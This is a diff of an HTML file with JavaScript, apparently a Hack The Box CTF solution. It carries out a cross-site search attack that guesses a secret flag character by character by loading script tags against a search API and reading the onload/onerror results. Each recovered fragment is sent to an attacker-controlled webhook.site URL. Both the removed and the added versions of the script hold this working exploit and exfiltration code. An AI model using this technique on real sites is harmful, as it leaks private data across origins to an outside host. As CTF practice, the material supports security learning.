@@ -4,31 +4,71 @@
 
 <html>
 <script>
-var ip = '127.0.0.1:1337';
-var ip2 = '46.101.14.124:30383';
-var hook = 'https://webhook.site/3fec1021-2d5a-44ec-a591-8bc65a7157bc';
-var flag = 'Ba';
-var abc = '-+!@%abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_';
-var special = '\"\'\\';
-var url1 = `http://${ip2}/api/entries/search?q=`;
-async function getPartialFlag(char){
- return new Promise((resolve, reject)=>{
- const script = document.createElement("script");
- script.src = url1+encodeURIComponent(flag+char);
- script.onload = () => char==='}' ? reject(char):resolve(char);
- script.onerror = () => reject(char);
- document.head.appendChild(script);
- });
+var url = "http://46.101.14.124:30383/api/entries/search?q=";
+
+/*
+String that will always contain what we know is definitely in the flag
+HTB{ is our base case as we know this begins the flag
+We build from this base case
+*/
+var flag = "HTB{";
+
+
+/*
+Take care with this alphabet, remove "&" and "%" (query params, wildcard)
+and put the underscore at the end as it represents a single character wildcard
+and so should be checked last as otherwise it will always be appended to the flag
+*/
+var a = "{}0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!$'()*+,-./:;<=>@[]^|_";
+
+
+// Asynchronous as we wish to wait for this to complete before continuing
+// Checks the status code when we query with a specific character
+async function check(char) {
+    return new Promise((resolve, reject) => {
+
+    	// Create a script tag to query the api endpoint with the character via src attribute
+        var s = document.createElement("script");
+        s.src = url+flag+char;
+
+        // onload: 200 => resolve (character is the next in the flag)
+        s.onload = () => {resolve(char);};
+
+        // onerror: 404 => reject (character is invalid)
+        s.onerror = () => {reject(char);};
+
+        document.head.appendChild(s);
+
+    });
 }
-async function getFlag(chars) {
- var b = false; var char;
- for(var i=0; i < chars.length; i++){
- char = special.includes(chars[i]) ? '\\'+chars[i]:chars[i];
- await getPartialFlag(char).then((res) => {flag=flag.concat(res); b = res==='}' ? true:false; i=0} , (res)=> { } );
- if(b) break;}
- fetch(`${hook}?${flag}`, {method:'get'});
-};
-getFlag(abc);
+
+
+var i = 0;
+async function loop() {
+    while (true) {
+        char = a[i];
+        // Check this character, wait for the result, then depending on its result, do 2 different things:
+        await check(char).then((res) => {
+        	/*
+        	1st: if it was resolved (accepted), append it to the string of known characters
+        	that begin the flag and send this to a webhook that we control
+        	so that we can get also get this information
+        	*/
+            flag += res;
+            fetch("https://webhook.site/3fec1021-2d5a-44ec-a591-8bc65a7157bc?"+flag);
+
+            // Start from the first character again
+            i = 0;
+
+        }, (res) => {
+        	// 2nd: if it was rejected, move onto the next character
+        	i++;
+
+        });
+    }
+}
+
+loop();
 </script>
 <html>
 
